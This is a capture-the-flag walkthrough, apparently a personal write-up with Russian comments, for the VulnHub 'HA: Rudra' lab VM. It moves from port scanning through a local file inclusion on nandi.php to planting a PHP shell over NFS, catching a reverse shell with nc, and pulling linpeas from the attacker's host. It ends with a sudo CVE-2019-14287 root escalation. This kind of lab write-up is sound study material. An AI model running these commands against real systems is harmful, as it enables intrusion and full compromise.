https://www.vulnhub.com/entry/ha-rudra,386/

1)nmap -sV -sC -p- 192.168.225.147
22/tcp open ssh
80/tcp open http
111/tcp open rpcbind
2049/tcp open nfs_acl
44147/tcp open mountd
44479/tcp open nlockmgr
47691/tcp open mountd
52255/tcp open mountd

2)gobuster -w /root/Downloads/common.txt -x zip,php,txt,html,bac,mp4,docx,doc,sh,bak -e -u dir http://192.168.225.147
http://192.168.225.147/assets
http://192.168.225.147/img
http://192.168.225.147/index.html
http://192.168.225.147/index.html
http://192.168.225.147/robots.txt

80-port

1)curl 192.168.225.147/robots.txt  
 nandi.php

2)curl 192.168.225.147/nandi.php

    its empty, hmmmmm maybe you need a parameter in the request

3)curl 192.168.225.147/nandi.php?file=/etc/passwd
root:x:0:0:root:/root:/bin/bash
....
rudra:x:1000:1000:rudra,,,:/home/rudra:/bin/bash
....
mahakaal:x:1001:1001:,,,:/home/mahakaal:/bin/bash
....
shivay:x:1002:1002:,,,:/home/shivay:/bin/bash

2049-port

1)showmount -e 192.168.225.147
Export list for 192.168.225.147:
/home/shivay \*

2.       mkdir /tmp/mar
        mount 192.168.225.147:/home/shivay /tmp/mar
        ls -al /tmp/mar
            .bash_logout
            .bashrc
            mahadev.txt
            .profile

    3)cp /root/shell.php /tmp/mar

80-port

1.  rlwrap nc -nlvp 1234
    curl 192.168.225.147/nandi.php?file=/home/shivay/shell.php

22-port

1.  python3 -c "import pty;pty.spawn('/bin/bash');"
    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

2.  <on-victim-machine>cd /tmp
    <on-own-machine>python3 -m http.server
    <on-victim-machine>wget 192.168.225.128:8000/linpeas.sh

3.  chmod +x linpeas.sh
    ./linpeas.sh
    ....  
     ═╣ MySQL connection using root/NOPASS ................. Yes

4.  mysql -uroot
    show databases;
    ...
    mahadev
    use mahadev;
    show tables;
    hint
    select \* from hint;
    +---------------------------+
    | check on media filesystem |
    +---------------------------+
    exit;

5.  ls -al /media
    creds
    hints

    cat /media/creds
    😴
    😬
    😥
    😭
    🐼
    😬
    🙈
    😕
    🐼
    😬
    🐵
    😊
    😀
    😻
    😥
    😓
    🐼
    😅
    😕
    😕
    😀
    🙊
    😾
    😕
    😝
    😛
    🙎
    🙎

    cat /media/hints
    https://www.hackingarticles.in/cloakify-factory-a-data-exfiltration-tool-uses-text-based-steganography/

          without noise

6.  <on-own-machine>
     python2 cloakifyFactory.py
         Selection: 2
         Enter filename to decloakify (e.g. /foo/bar/MyBoringList.txt): /root/test
         Save decloaked data to filename (default: 'decloaked.file'): /root/test1
         Preview cloaked file? (y/n default=n): 
         Was noise added to the cloaked file? (y/n default=n):
         Enter cipher #: 20
     cat /root/test1
         mahakaal:kalbhairav

22-port

ssh mahakaal@192.168.225.147

1.  sudo -l
    (ALL, !root) /usr/bin/watch

сначала я подумала, что надо стать rudra для дальнейшего повышения привиллегий
sudo -u rudra watch -x sh -c 'reset; exec sh 1>&0 2>&0'
но это мне ничем не помогло

при запуске linpeas.sh я заметила, что предлагаются различные способы повышения привиллегий через sudo, проверим как на уязвимость этот сервис

    sudo --version
        Sudo version 1.8.21p2

Это уязвимая версия, я легко нашла в интернете способ повышения привиллегий (CVE-2019-14287)
sudo -u#-1 watch -x sh -c 'reset; exec sh 1>&0 2>&0'

    cat /root/final.txt
        ....
        !! Congrats you have finished this task !!

lfi,vulnerable_version_sudo
